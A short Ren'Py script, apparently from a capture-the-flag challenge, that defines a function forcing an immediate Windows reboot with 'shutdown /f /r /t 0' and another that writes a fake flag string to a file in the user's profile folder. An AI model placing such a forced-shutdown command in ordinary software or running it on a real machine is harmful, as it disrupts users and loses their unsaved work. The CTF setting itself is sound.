init python:

    def restart():
        import os
        os.system("shutdown /f /r /t 0")
    def createFlag():
        import os
        flag = 'FIA{{Another Another fake flag}'
        f = open(os.environ["USERPROFILE"] + '/flag.txt',"w")
        f.write(flag)
        f.close()
